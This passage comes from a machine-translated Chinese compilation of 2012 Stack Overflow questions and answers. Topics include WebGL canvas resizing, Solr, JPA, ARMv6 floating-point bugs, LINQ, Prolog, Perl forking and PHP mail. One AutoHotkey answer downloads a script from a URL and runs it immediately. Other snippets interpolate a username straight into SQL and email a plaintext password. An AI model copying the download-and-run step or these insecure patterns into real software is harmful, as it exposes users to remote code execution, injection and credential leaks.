  ADD `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP, COMMENT=''; 
```

新查询：

```
SELECT * FROM `comment` WHERE
  `username` = '$username' ORDER BY `timestamp` DESC LIMIT 1 
```

# canvas - 根据浏览器窗口大小调整视口/画布大小

> ID：13870677
> 
> 赞同：11
> 
> 时间：2012-12-13T23:58:33.967
> 
> 标签：canvas, webgl, viewport

我希望我的 webgl 应用程序视口和画布能够对浏览器窗口大小的变化（包括 F11 按钮）做出反应。即，我希望画布的宽度和高度始终为 100%，并且我希望视口大小和纵横比适当。前者我用简单的方法实现：

```
<canvas style="width: 100%; height:100%;"> 
```

虽然我不确定这是否是要走的路。后者我试图用我在这里找到的一些信息来实现：[Webgl gl.viewport change](https://stackoverflow.com/questions/11819768/webgl-gl-viewport-change)但显然我做错了什么。我确实意识到：

```
canvas.onresize = resizeViewport; 
```

是错误的，因为画布的大小不会经常改变（它总是 100% 的宽度和高度），但我不知道我应该怎么做。

这是该应用程序的在线版本：http: [//nps.netarteria.pl/gallery](http://nps.netarteria.pl/gallery)。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-14T07:02:03.080

我认为这有效：

```
var canvas;
var gl;

function render() {
  gl.viewport(0, 0, gl.canvas.width, gl.canvas.height);

  // Draw a 1 pixel border around the edge using 
  // the scissor test since it's easier than setting up
  // a lot of stuff
  gl.clearColor(1, 0, 0, 1);  // red
  gl.disable(gl.SCISSOR_TEST);
  gl.clear(gl.COLOR_BUFFER_BIT);

  gl.enable(gl.SCISSOR_TEST);
  gl.scissor(1, 1, gl.canvas.width - 2, gl.canvas.height - 2);
  gl.clearColor(0, 0, 1, 1);  // blue
  gl.clear(gl.COLOR_BUFFER_BIT);
};

function resizeCanvas() {
  var width = canvas.clientWidth;
  var height = canvas.clientHeight;
  if (canvas.width != width ||
      canvas.height != height) {
    canvas.width = width;
    canvas.height = height;

    // in this case just render when the window is resized.
    render();
  }
}

function main() {
  canvas = document.getElementById("c");
  gl = canvas.getContext("webgl");
  resizeCanvas();
}

window.addEventListener('resize', resizeCanvas);
main();
```

```
body { 
  margin: 0;
}
#c {
  width: 100vw;
  height: 100vh;
  display: block;
}
```

```
<canvas id="c"></canvas>
```

据我所知，调整大小仅适用于窗口。不幸的是，HTML5 规范没有为其他元素添加调整大小事件。

注意：如果您总是在渲染（例如游戏），那么您不需要监听 resize 事件。只需在渲染循环开始时调用 resizeCanvas 即可。如果浏览器调整了画布的大小，无论其容器如何，代码都会看到大小不再匹配并更新画布的绘图缓冲区的大小。

渲染画布的正确视口大小几乎总是：

```
// Set the viewport to be the size of the canvas's drawingBuffer.

gl.viewport(0, 0, gl.canvas.width, gl.canvas.height); 
```

然而，如果您使用的是典型的 3D 数学库，那么您还有一个投影矩阵和一个函数——通常被称为`perspective`接受 fieidOfView、aspect、zNear 和 zFar 参数的函数。几乎所有 WebGL 程序的正确方面是：

```
// Set the aspect of our perspective matrix to match the size
// the canvas is displayed at.

var aspect = gl.canvas.clientWidth / gl.canvas.clientHeight
???.perspective(fieldOfView, aspect, zNear, zFar); 
```

* * *

## 更新

显然你需要缓存clientWidth和clientHeight。原因是设置`canvas.width`会改变可以改变的CSS布局`clientHeight`

更新了上面的代码。

## 更新2

从 using 切换`100%`到`100vw`and`100vw`因为这些可以说是更正确的。他们描述了您想要什么使画布成为视口的大小，而先前的解决方案使画布成为文档的大小，然后尝试强制文档成为窗口的大小。由于文档的内容可能比可能是错误解决方案的窗口大。

# download - 运行下载的脚本

> ID：13870680
> 
> 赞同：3
> 
> 时间：2012-12-13T23:58:45.633
> 
> 标签：download, include, reload, autohotkey

这很简单。

我想创建一个快捷方式：
1) 从网站 URL 下载 .ahk 脚本。（此脚本会更改。它需要获取最新版本。）
2) 立即运行脚本。

UrlDownloadToFile 可以在本地下载文件。
#Include 可以在脚本中包含文件。
并且 Reload 可以重新启动当前脚本。

当然，迄今为止最好的解决方案需要使用多个热键。一个用于下载和重新加载，另一个用于在下载后运行脚本本身。

有谁知道如何在一个热键中完成此操作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T09:44:50.677

运行的脚本中可能包含此内容。（启动器.ahk）

```
URLDownloadToFile, http://example.org/script.ahk, script.ahk
FileDelete timesince.dat
FileAppend, %A_Now%
Run script.ahk 
```

在 script.ahk 的顶部

```
FileRead, old_time, timesince.dat
If (!old_time) or (A_Now - old_time >= 10000) ; Expire in one hour minutes
{
    Run launcher.ahk
    ExitApp
}
; Actual code 
```

# php - 索引时，当整数字段类型为空时，Solr 返回 400 状态错误请求

> ID：13870682
> 
> 赞同：3
> 
> 时间：2012-12-13T23:58:56.143
> 
> 标签：php, search, solr, lucene

在我的 Solr schema.xml 中，我有一个整数字段和 text_general 字段

```
<field name="popularity" type="int" indexed="true" stored="true" />
<field name="priority" type="text_general" indexed="true" stored="true" /> 
```

当我尝试将以下数据索引到 Solr 时，我得到“400”状态：错误请求

```
 <add>
        <doc>
            <field name="popularity"></field>
            <field name="id">id_001</field>
            <field name="priority">10</field>
        </doc>
    </add> 
```

虽然当我索引以下数据时效果很好：

```
 <add>
        <doc>
            <field name="popularity">5</field>
            <field name="id">id_002</field>
            <field name="priority"></field>
        </doc>
    </add> 
```

那么这是否意味着整数字段不能为空，而 text_general 可以？

我正在使用 SolrPHPClient 来索引数据。[http://code.google.com/p/solr-php-client/](http://code.google.com/p/solr-php-client/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T03:37:49.493

不使用您不想设置的字段是否也有效，例如：

```
<add>
    <doc>
        <field name="id">id_001</field>
        <field name="priority">10</field>
    </doc>
</add> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-12T09:39:27.327

我遇到了同样的问题，只需转到 solr 管理页面并重新加载您的核心管理员，然后错误就消失了

# javascript - Javascript的动态加载

> ID：13870684
> 
> 赞同：1
> 
> 时间：2012-12-13T23:59:20.557
> 
> 标签：javascript, ajax, jquery, unobtrusive-javascript

我目前正在使用 JQuery 构建一个 Ajax Web 应用程序，它允许用户在同一区域多次打开同一页面。尽管允许这样做，但它往往会导致与 DOM 和“唯一 ID”有关的冲突。

因此，我创建了一个系统，如果您喜欢在 PHP 中使用唯一的 id 在发送出去之前对 javascript 进行预编程。然后将其作为 .php 文件发送给用户。

代码与此类似：用户希望在 content_area 中加载页面，该内容区域向服务器发送 AJAX 请求，并使用该 content_area 的 ID 成为唯一 ID。服务器发回一个类似“myscript.php”的页面，其中包含以下内容：

```
 <script>
$(function() {
    var unique_id="<?php echo $unique_id; ?>"

    var new_div=$("<div id='content" + unique_id + "'>");
    });
    </script> 
```

我想知道这是一个坏主意，还有其他选择吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T09:05:18.447

您可以预渲染网站的整个（大）部分，然后使用一些 JS 映射器/加载器来动态加载脚本并执行自定义代码。

您可以创建 jQuery 插件来处理功能的不同部分并在需要时加载它们。在 JS Loaders 上，在[jster.net](http://jster.net/category/loaders)上有一个完整的部分。对于路由，您可以使用[Davis Mapper](http://jster.net/library/davis-js)之类的东西。

最好让 JS 资源尽可能保持静态，并通过对服务器端的 AJAX 调用来处理动态内容。希望这有帮助。:)

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-12-14T00:06:06.477

您需要添加一个 php 标头，以便浏览器知道它是 JavaScript 文件而不是 php。

```
<?php
header('Content-type: text/javascript');
?>
<script>
$(function() {
 var unique_id="<?php echo $unique_id; ?>"
 var new_div=$("<div id='content" + unique_id + "'>");
 });
</script> 
```

然后你可以使用：

```
<script type="text/javascript" src="myscript.php"> 
```

# jpa - datanucleus EntityManager 合并正在插入新行而不是更新

> ID：13870690
> 
> 赞同：0
> 
> 时间：2012-12-13T23:59:44.557
> 
> 标签：jpa, merge, datanucleus

客户调查.java

```
 public class CustomerSurvey
    implements Serializable
 {

/**
 * 
 */
private static final   long  serialVersionUID = 1L;

@Id @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "CUSTOMER_SURVEY_SEQUENCE") @Column(name = "SURVEYID", nullable = false) private String surveyId;

@ManyToOne(fetch = FetchType.EAGER, cascade = CascadeType.ALL) @JoinColumn(name = "CUSTNO", referencedColumnName = "CustNO") private Customer               customer;
@Column(name = "AVGRATINGS") private double                                                                                                                 avgRatings;

@Column(name = "COMMENTS") private String                                                                                                                   comments;

@Column(name = "SENTON") private Date                                                                                                                       sentOn;

@Column(name = "RESPONDEDON") private Date                                                                                                                  respondedOn;

@Column(name = "RESPONDED") int                                                                                                                             responded;
@Basic(fetch = FetchType.EAGER) @OneToMany(mappedBy = "customerSurvey", cascade = CascadeType.ALL) private Set<SurveyResponse>                              responses;

@XmlTransient @OneToOne(fetch = FetchType.LAZY, cascade = CascadeType.DETACH) @JoinColumn(name = "SRNO") private ServiceRequest                             serviceRequest;

@Column(name = "ATTACHMENT") @Lob @Basic(fetch = FetchType.EAGER) private byte[]                                                                            attachment;
--- getters and setters---

 public int hashCode()
     {
    return new HashCodeBuilder(17,31)
    .append(this.surveyId)
 //        .append(this.avgRatings)
 //        .append(this.getResponded())
    .toHashCode();

}

@Override
public boolean equals(Object obj)
{

    return new EqualsBuilder().
            append("SurveyId",this.surveyId)
//                .append("responded", this.getResponded())
//                .append("AvgRatings", this.getAvgRatings())
            .isEquals();
} 
```

持久性代码：public void submitSurveyResponse（列表调查）抛出 WorkServiceException {

```
 if ( this.entityManagerFactory == null )
    {
        this.entityManagerFactory = this.getEntityManagerFactory();
    }

    EntityManager em = this.entityManagerFactory.createEntityManager();
    EntityTransaction tx = em.getTransaction();

    for (CustomerSurvey survey : surveys)
    {
        tx.begin();
        survey.setRespondedOn(Calendar.getInstance().getTime());
        survey.setResponded(BooleanResponse.YES.getCode());
        survey.setCustomer(em.find(Customer.class, survey.getCustomer().getCustNo().trim()));
        survey.setComments("Survey Response submitted");
        for (SurveyResponse response : survey.getResponses())
        {
            response.setQuestionair(em.find(Questionair.class, response.getQuestionair().getqNo()));
        }

        CustomerSurvey cs = em.find(CustomerSurvey.class, survey.getSurveyId());
        System.out.println(survey.equals(cs));
        Query query1 = em.createQuery("SELECT  from CustomerSurvey customerSurvey where customerSurvey.surveyId = :id")
                .setParameter("id", survey.getSurveyId());
        CustomerSurvey dbSurvey = (CustomerSurvey) query1.getResultList().get(0);
        System.out.println(":" + survey.equals(dbSurvey));

        if(survey.getServiceRequest() == null) {
            cs = em.find(CustomerSurvey.class, survey.getSurveyId());
            survey.setServiceRequest(cs.getServiceRequest());
        }
        CustomerSurvey mSurvey = em.merge(survey);

        String surveyId = mSurvey.getSurveyId();
        Query query = em.createNamedQuery("surveyResponse.getAverageRatings");
        logger.trace(query.toString());
        query.setParameter("surveyId", surveyId);
        logger.trace(query.toString());

        Double avgRating = (Double) query.getSingleResult();
        if ( avgRating == null )
        {
            avgRating = new Double(0);
        }
        BigDecimal bd = BigDecimal.valueOf(avgRating);
        bd = bd.setScale(2, RoundingMode.HALF_UP);
        avgRating = bd.doubleValue();
        mSurvey.setAvgRatings(avgRating);
        em.flush();
        tx.commit();
   }
    em.clear();
    em.close();
} 
```

它不更新，而是插入新行。在使用 hashcode builder 和 equals builder 之后，我得到了错误的以下检查： System.out.println(":" +survey.equals(dbSurvey)); 的测试 给出 false System.out.println(survey.equals(cs)) 的测试；上面给出了错误。

请指教

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-15T07:27:14.040

根据 JPA 规范， “瞬态”和“分离”是不同的状态，并且在*merge()*中会有不同的行为。瞬态将创建一个新对象。与更新现有的分离。在修改之前获取分离的对象，或阅读[http://www.datanucleus.org/products/accessplatform_3_2/jpa/object_lifecycle.html上的“分离”部分](http://www.datanucleus.org/products/accessplatform_3_2/jpa/object_lifecycle.html)

# android-ndk - Android NDK：ARMv6 + VFP 设备。计算错误、NaN、非正规数、VFP11 错误

> ID：13870691
> 
> 赞同：2
> 
> 时间：2012-12-13T23:59:53.067
> 
> 标签：android-ndk, arm, nan, armv6

我希望以 VFP Android 设备为目标 ARMv6。

我的`Android.mk`文件中有以下行可以启用`VFP`

```
LOCAL_CFLAGS    := -marm -mfloat-abi=softfp -mfpu=vfp -Wmultichar 
```

我相信我的目标`ARMv5`是`VFP`.

我编辑`android-ndk-r8b\toolchains\arm-linux-androideabi-4.6\setup.mk`删除`-msoft-float`. 我也试过原版`setup.mk`

我的代码在 99.99% 的情况下都可以正常工作，但有时在 ARMv6 设备上会发疯。我有特殊的代码来检测它何时发疯。

**代码**

```
glm::vec3 D = P1 - P2;
float f1 = sqrtf(D.x*D.x + D.y*D.y + D.z*D.z);
if(!(f1 < 5)){
    // f1 is bigger then 5 or NaN
    mylog_fmt("Crazy %f %f %f %f", P1.x, P1.y, P1.z, f1);
    mylog_fmt("%f %f %f", P2.x, P2.y, P2.z);
} 
```

**日志猫**：

```
12-14 00:59:08.214: I/APP(17091): Crazy -20.000031 0.000000 0.000000 20.000000
12-14 00:59:08.214: I/APP(17091): -20.000000 0.000000 0.000000 
```

它计算2点之间的距离。通常它是 0.000031 但是当`crazy mode`它是 20.0

当我在 ARMv7 CPU 上运行它时，问题不存在。它仅存在于 ARMv6 CPU 上。

我相信它应该是一些与编译器设置或版本相关的常见已知错误。可能是代码缺少内存屏障。

我希望看到一些对类似错误的参考。解决它的方法。或关于错误的性质。

当 ARMv7 上的相同代码不给出 NaN 时，我也经常在 ARMv6 上得到 NaN 值。

我已经调试了 2 周的代码并在网上搜索。如果有人可以分享类似问题的链接，那将是一个很大的帮助！

PS。这是编译命令之一的示例。我已经尝试了许多不同的设置。

**编译器设置**

```
c:/soft/Android/android-ndk-r8b/toolchains/arm-linux-androideabi-4.6/prebuilt/windows/bin/arm-linux-androideabi-g++
-MMD -MP -MF ./obj/local/armeabi/objs/main/sys/base.o.d -fpic -ffunction-sections -funwind-tables -fstack-protector 
-D__ARM_ARCH_5__ -D__ARM_ARCH_5T__ -D__ARM_ARCH_5E__
-D__ARM_ARCH_5TE__  
-march=armv5te -mtune=arm6 
-mfloat-abi=softfp -mfpu=vfp
-fno-exceptions -fno-rtti -mthumb -Os -fomit-frame-pointer -fno-strict-aliasing -finline-limit=64 
-Ijni/main/ -Ijni/main/sys -Ijni/main/bullet/src -Ijni/main/bullet/src/LinearMath -Ijni/main/bullet/src/BulletCollision/BroadphaseCollision 
-Ijni/main/bullet/src/BulletCollision/CollisionDispatch -Ijni/main/bullet/src/BulletCollision/CollisionShapes -Ijni/main/bullet/src/BulletCollision/NarrowPhaseCollision 
-Ijni/main/bullet/src/BulletDynamics/ConstraintSolver -Ijni/main/bullet/src/BulletDynamics/Dynamics -Ijni/main/../libzip/ -Ic:/soft/Android/android-ndk-r8b/sources/cxx-stl/stlport/stlport 
-Ic:/soft/Android/android-ndk-r8b/sources/cxx-stl//gabi++/include -Ijni/main 
-DANDROID

-marm -march=armv6 -mfloat-abi=softfp -mfpu=vfp -Wmultichar

-Wa,--noexecstack  -frtti  -O2 -DNDEBUG -g   -Ic:/soft/Android/android-ndk-r8b/platforms/android-5/arch-arm/usr/include -c  jni/main/sys/base.cpp
-o ./obj/local/armeabi/objs/main/sys/base.o 
```

**更新 2**

所有这些设备都有高通 MSM7227A 它有 ARM1136JF-S

到目前为止我了解到的是，该错误可能与`de-norms` 我在某处读到 ARMv7 与 ARMv6 的差异有关，该差异`denorms`默认情况下已刷新为零，而 ARM1136SF-S 可以选择使用它。 [http://infocenter.arm.com/help/topic/com.arm.doc.ddi0211k/DDI0211K_arm1136_r1p5_trm.pdf](http://infocenter.arm.com/help/topic/com.arm.doc.ddi0211k/DDI0211K_arm1136_r1p5_trm.pdf)

尚不确定如何验证 ARM 上的 Flush-To-ZERO 标志。

**更新 3**

这个 CPU 的 VFP 被称为`VFP11` I found `--vfp11-denorm-fix`option。他们还`--vfp-denorm-fix` 纠正了`VFP11`cpus 中的错误。看起来像我的目标问题。发现一些关于 VFP11 勘误的帖子。希望它能修复代码。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-18T23:12:19.887

好像我发现了错误。

它是 VFP11（ARMv6 协处理器）denorm 错误中的错误。 [非正规数](http://en.wikipedia.org/wiki/Denormal_number)是非常小的数。

我在物理代码中得到这个数字，实现带有倾倒的弹簧

```
force1 = (Center - P1) * k1         // force1 directed to center 
force2 = - Velocity * k2            // force2 directed against velocity
Object->applyForce(force1)
Object->applyForce(force2) 
```

当对象归档时，两种力量都变得非常小`Center`，最后我得到`denormal`了值。

我可以重写 sring 和 dump，但我不能重写洞 BulletPhysics 或所有数学代码并预测非正规数的每次（甚至内部）出现。

链接器具有修复代码选项`--vfp11-denorm-fix`和`--vfp-denorm-fix` [http://sourceware.org/binutils/docs-2.19/ld/ARM.html](http://sourceware.org/binutils/docs-2.19/ld/ARM.html)

NDK 链接器有`--vfp11-denorm-fix` 这个选项有帮助。代码看起来更可重复，但它不能 100% 解决问题。

我现在看到的错误越来越少。

但是，如果我等待稳定对象，那么我终于得到了 denorm -> NaN

我必须等待更长的时间，但同样的问题来了。

**如果您知道可以修复代码的解决方案，`--vfp11-denorm-fix`那么我应该给您赏金。**

我都试过`--vfp11-denorm-fix=scalar`了`--vfp11-denorm-fix=vector`

**清零位**

```
 int x;
      // compiles in ARM mode
      asm(
              "vmrs %[result],FPSCR \r\n"
              "orr %[result],%[result],#16777216 \r\n"
              "vmsr FPSCR,%[result]"
              :[result] "=r" (x) : :
      ); 
```

不知道为什么，但它需要`LOCAL_ARM_MODE := arm`在`Android.mk` May 中`-mfpu=vfp-d16`，而不是 just`vfp`是必需的。

**手动清除非正规数**

我有上面描述的弹簧代码。我通过手动清除非正规数来改进它，而不使用具有以下功能的 FPU。

```
inline void fixDenorm(float & f){
    union FloatInt32 {
        unsigned int u32;
        float f32;
    };
        FloatInt32 fi;
        fi.f32 = f;

        unsigned int exponent = (fi.u32 >> 23) & ((1 << 8) - 1);
        if(exponent == 0)
            f = 0.f;
} 
```

* * *

在许多地方，原始代码在 15-90 秒内失败。

在物理模拟 10 分钟后，当前代码仅在一个地方显示了可能与此错误有关的问题。

* * *

参考错误和修复 [http://sourceware.org/ml/binutils/2006-12/msg00196.html](http://sourceware.org/ml/binutils/2006-12/msg00196.html)

他们说`GCC`只使用 scalr 代码`--vfp11-denorm-fix=scalar`就足够了。它增加了 1 个额外的命令来减速。但即使`--vfp11-denorm-fix=vector`增加了 2 个额外的命令也是不够的。

问题不容易重现。在频率较高的 800Mhz 的手机上，我经常看到它，然后在较慢的 600Mhz 上看到它。当市场上没有快速 CPU 时，修复可能已经完成。

* * *

我们项目中有很多文件，每次配置编译大约需要 10 分钟。使用当前修复状态进行测试需要大约 10 分钟才能在手机上播放。+ 我们在灯下加热手机。热电话更快地显示错误。

我希望测试不同的配置并报告最有效的修复方法。但是现在我们必须添加 hack 来杀死最后一个可能与 denorms 相关的 bug。

我希望能找到能修复它的灵丹妙药，但只有`-msoft-float`在 10 倍性能下降或在 ARMv7 上运行应用程序时才能做到这一点。

* * *

在我用 spring/dumping 代码中的新函数替换以前的`fixDenorm`函数并`fixDenormE`为 ViewMatrix 应用新函数后，我摆脱了最后一个错误。

```
inline void fixDenormE(float & f, float epsilon = 1e-8){
    union Data32 {
        unsigned int u32;
        float f32;
    };
        Data32 d;
        d.f32 = f;

        unsigned int exponent = (d.u32 >> 23) & ((1 << 8) - 1);
        if(exponent == 0)
            f = 0.f;
        if(fabsf(f) < epsilon){
          f = 0.f;
        }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-18T20:33:31.013

这个页面有一个关于 ARM FPU 选项的有趣讨论：[VfpComparison](http://wiki.debian.org/ArmHardFloatPort/VfpComparison)

我认为如果您想为 ARM v6 构建，您可以这样做：（`-march=armv6 -mcpu=generic-armv6 -mfloat-abi=softfp`并省略 -mfpu 选项）。如果您没有专门针对您上面提到的处理器，则通用 armv6 没有保证的 fpu。

另一种选择是尝试`-mfloat-abi=hard`，理论上softfp 周围存在编译器错误。

还要检查代码中是否有任何堆栈损坏等，当传递浮点值时，您可能会破坏它们。

PS 您可能还想尝试一个浮点测试器，例如[TestFloat](http://www.jhauser.us/arithmetic/TestFloat.html)或古老的 netlib [paranoia](http://www.netlib.org/paranoia/paranoia.c)。虽然您有一个在此特定处理器和这些编译器选项上出现浮点失败的示例，但您不知道它的问题有多普遍。它可能比你想象的更糟:)

# sql - 如何将带有count的sql转换为linq

> ID：13870693
> 
> 赞同：3
> 
> 时间：2012-12-14T00:00:12.123
> 
> 标签：sql, linq

如何将其转换为 linq？

```
select i.CatName,COUNT(*) as n_items
from ixcxs i
group by i.CatName 
```

或 lambda 表达式会有所帮助

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-14T00:31:12.677

您无需从组中选择第一项来获取 CatName - 请改用分组键：

```
var query = from i in ixcxs
            group i by i.CatName into g
            select new {
               CatName = g.Key,
               n_items = g.Count()
            }; 
```

与方法语法相同：

```
var query = ixcxs.GroupBy(i => i.CatName)
                 .Select(g => new { CatName = g.Key, n_items = g.Count() }); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-14T00:10:26.470

尝试

```
ixcxs.GroupBy(g => g.CatName)
    .Select(s => new 
    {
        CatName = s.Key, 
        n_items = s.Count() 
    }); 
```

查询语法中的相同内容：

```
from i in ixcxs
group i by i.CatName into g
select new 
{
    CatName = g.Key,
    n_items = g.Count()
} 
```

# if-statement - 终端的无限列表 - Prolog 语法规则

> ID：13870698
> 
> 赞同：0
> 
> 时间：2012-12-14T00:00:43.530
> 
> 标签：if-statement, prolog, context-free-grammar, dcg

使用语法规则时，是否可以在 Prolog 中定义无限数量的终端？

以下示例描述了该问题：

```
selection-->([if,'('],condition,[')',
then,'{'],commands,['}']);([if,'('],condition,[')',
then,'{'],commands,['}',else,'{'],commands,['}']).
condition-->[X].
commands-->[X]. 
```

这里，“条件”和“命令”块可以有不定数量的元素。如何在 Prolog 中指定？条件的产生规则和我在这里提供的命令只允许一个原子。

我希望以下陈述是真实的，但这条规则 ,`condition-->[X].`只允许这些括号之间有一个原子：

```
selection([if,'(',a,<,b,')',then,'{',a,+,+,'}',else,'{',c,'}'], []). 
```

**附录**

如何让程序从语句中创建语法树？例如，如果输入以下语句：

`selection( S, [ if, '(', a, <, b, ')', then, '{', a, +, +, '}' ], [] ).`,

结果应该是`S = selection(if(condition([a,<,b])),then(commands([a,+,+])))`。

我需要对代码进行哪些更改？

非常感谢您提前。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T06:26:41.987

使用递归：

```
condition --> [X], ( condition_separator, condition ; [] ). 
```

condition_separator 可以为空，然后省略

**编辑**

要生成语法树，最简单的方法是将参数添加到产品中，复制“形状”（未经测试的代码）：

```
selection(Tree) -->
  [if,'('], condition(Condition1), [')', then,'{'], commands(Commands1), ['}'],
  {Tree = selection(Condition1, Commands1)}
  ;
  [if,'('],condition(Condition1),[')', then,'{'], commands(Commands1),
  ['}', else,'{'], commands(Commands2),['}'],
  {Tree = selection(Condition1, Commands1, Commands2)}
  .

condition(X)-->[X].
commands(X)-->[X]. 
```

然后在访问树时使用不同的arity（参数计数）选择来恢复解析的分支。

假设我们有命令列表，其中每个命令都以“;”终止：这可能是

```
commands([C|Cs]) --> command(C), [';'], commands(Cs).
commands([]) --> []. 
```

# perl - Plackup 和 Starman 下的舞者；分叉会留下失效的starman进程吗？

> ID：13870702
> 
> 赞同：1
> 
> 时间：2012-12-14T00:01:08.410
> 
> 标签：perl, perl-module, fork, dancer, plack

作为我在此处的另一个问题的后续行动：[使用 Perl 的 Dancer 在子进程中分叉运行代码](https://stackoverflow.com/questions/13614498/forking-to-run-code-in-a-child-process-with-perls-dancer)- 如何分叉在 plackup/starman/dancer 下运行的请求而不会导致子进程处于僵尸状态？

例如我正在尝试做的事情：

```
post '/handle_data' => sub {

# perform some calculations
...
# store some data
...
fork and return; # parent request
# do some long running tasks
...
exit; # child 
```

};

... 导致 starman 工人被回收，但剩余的 plakup 过程失效。

从 perlipc，我也尝试过设置`$SIG{CHLD} = "IGNORE"`，但无济于事。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T03:48:06.997

分叉时，父进程不会退出，而是等待子 pid。如果我记得`fork`是使用孩子的 pid 设置返回值或特殊变量；所以你需要抓住它。哦，注册一个`$SIG{INT}`同样等待的处理程序。

您可能正在寻找使用[waitpid](http://perldoc.perl.org/functions/waitpid.html)。

# java - 在 Eclipse 中禁用“转到父类”三角形

> ID：13870706
> 
> 赞同：3
> 
> 时间：2012-12-14T00:01:44.973
> 
> 标签：java, eclipse, ide, eclipse-indigo

在 Eclipse Indigo 中，Java 编辑器中的覆盖方法旁边有一个小三角形，单击该三角形将带您进入覆盖方法定义。它恰好位于您单击以添加断点的区域的顶部，这比通过 ctrl-click 轻松完成的操作要频繁得多。

我环顾四周，无法弄清楚这个功能的名称是什么，或者如何关闭它。有任何想法吗？

这是有问题的行为不端的按钮：

![日食的](../Images/f9289cafcc7d355856f7e0243c772305.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-14T00:10:57.480

那是一个编辑器注释。

在 Juno 中，至少您可以在 General > Editors > Text Editors > Annotations 中从首选项中关闭它们，取消勾选在垂直标尺中显示： ![Mac 上的 Eclipse 首选项](../Images/b5b638204a7ddd2c772b752296b5f45e.png)

# php - 通过php发送邮件不起作用

> ID：13870708
> 
> 赞同：2
> 
> 时间：2012-12-14T00:01:51.783
> 
> 标签：php, smtp, sendmail

我一直在尝试为我的网站发送电子邮件确认。人们可以毫无问题地注册，并且所有内容都注册到数据库中，但它不会发送电子邮件。我正常尝试了，它给了我一些关于 smtp 服务器的错误，所以有人说我应该尝试 SurgeMailer。我下载了它，现在电子邮件实际上说他们已发送，但电子邮件从未收到它们。任何帮助都会很棒！这是发送电子邮件的代码。

```
/*Send Email here*/
$to=$Email;

$subject="Newgenstudios Account Confirmation";

/*From*/
$header="From:Newgenstudios <noreply@newgenstudios.com>";

/* Your message */   /*Not Finished */
$message = "<h3>Welcome to the site ".ucfirst(strtolower($First_Name))."!</h3>
<p>To complete your account registration, you must activate your account. Click on the link below or paste it into the URL to activate your account.</p>
<p><a href='http://localhost/confirmation.php?passkey=$confirm_code'>Activate Now!</a </p>
<p>Once your account has been activated, you may log in at anytime using the information you supplied below:<br />
<strong>Email: </strong>$Email<br />
<strong>Password: </strong>$Password</p>
<p>Other Information:</p>
<strong>Name: </strong>$First_Name<br />
<strong>Phone: </strong>$Phone<br />
<p>Thank you for registering and see you on the site!</p>
<p>Did you not register? Then please disregard this message.</p>";

/* Send Email */
$sentmail = mail($to,$subject,$message,$header);
}

/*If not found*/
else {
echo "Not found your email in our database";
}

/* email succesfully sent */
if($sentmail){
echo "Your Confirmation link Has Been Sent To Your Email Address.";
}
else {
echo "Cannot send Confirmation link to your e-mail address";
}
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T00:47:45.627

1-尝试使用此邮件功能。

2-将“来自值”写为与您的域相关的有效电子邮件，例如：noreply@domain.com

3-如果步骤不起作用，请致电您的主机，我猜他们阻止了 mail() 功能。

```
function send_mail($to,$from,$subject,$msg){
        // message
        $message = '
        <html>
        <head>
          <title>Message</title>
        </head>
        <body dir="rtl">
        <p align="right">'
        . $msg .
        '</p>
        <br>

        </p>
        </body>
        </html>
        ';

        // To send HTML mail, the Content-type header must be set
        $headers  = 'MIME-Version: 1.0' . "\n";
        $headers .= 'Content-type: text/html; charset=utf-8' . "\n";

        // Additional heade rs
        $headers .= "From: ".$from . "\n";
        //$headers .= 'Bcc: info@domain.co.uk' . "\n";

        // Mail it
        return mail($to, '=?windows-1256?B?'.base64_encode($subject).'?=', $message, $headers);
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T00:53:55.343

我建议使用 Gmail 帐户发送电子邮件，这是为我设置的最快的帐户。（只是谷歌'发送 php gmail 电子邮件'）。另外，不要忘记检查垃圾邮件文件夹。

# html - 如何将包括 FB 和 Twitter 在内的社交按钮添加到自定义 Weebly 主题

> ID：13870713
> 
> 赞同：-1
> 
> 时间：2012-12-14T00:02:15.610
> 
> 标签：html, css, button, social

我已经破解了一个现有的主题，在 Weebly 中为我的网站 www.TheMathsTutor.ie 制作了一个自定义主题

我想在顶部的徽标右侧插入社交按钮。

我不知道如何将它们破解为主题（见附件）。

我曾尝试从各种来源窃取内容，但 (a) 我不是程序员 (b) 我不知道代码的含义以及 (c) 我不知道将其放在哪里。

希望有人可以建议。

* * *

```
/*
Theme Name:        PressCut Theme 
Theme URI:         http://www.isulongseophil.com/themes/
Description:      A fresh, clean, XHTML and CSS validated theme for WordPress by <a 

href="http://www.isulongseophil.com">Gio</a> based on <a 

href="http://cutline.tubetorial.com">Cutline Theme</a> originally designed and coded by <a 

href="http://pearsonified.com">Chris Pearson</a>.
Version:        1.0
Author:          Gio

*/

.img_border { border: #CCCCCC 1px; }

body { color: #333; background: #F5F5F5 url('bgd.gif') repeat-y scroll  50% 0; font: 62.5% 

Arial, "Times New Roman", Times, serif; text-align: center; }

* { padding: 0; margin: 0; }
/*---:[ global elements ]:---*/

a { color: #3888B4; background-color: #ffffff; text-decoration: underline; }a { color: 

#3d3d3d; background-color: #ffffff; text-decoration: underline; }

  a:visited { color: #9FCAE1; background-color: #ffffff; text-decoration: underline;}  

a:visited { color: #3d3d3d; background-color: #ffffff; text-decoration: underline;}

  a:hover { color: #8DC919; background-color: #ffffff; text-decoration: underline; }

  a img { border: none; }

blockquote { font-style: italic; font-family: Georgia, "Times New Roman", Times, serif; color: 

#555; background-color: #ffffff; margin: 0 30px 1.5em 30px; padding: 0 0 0 10px; border-left: 

1px solid #aaa; }

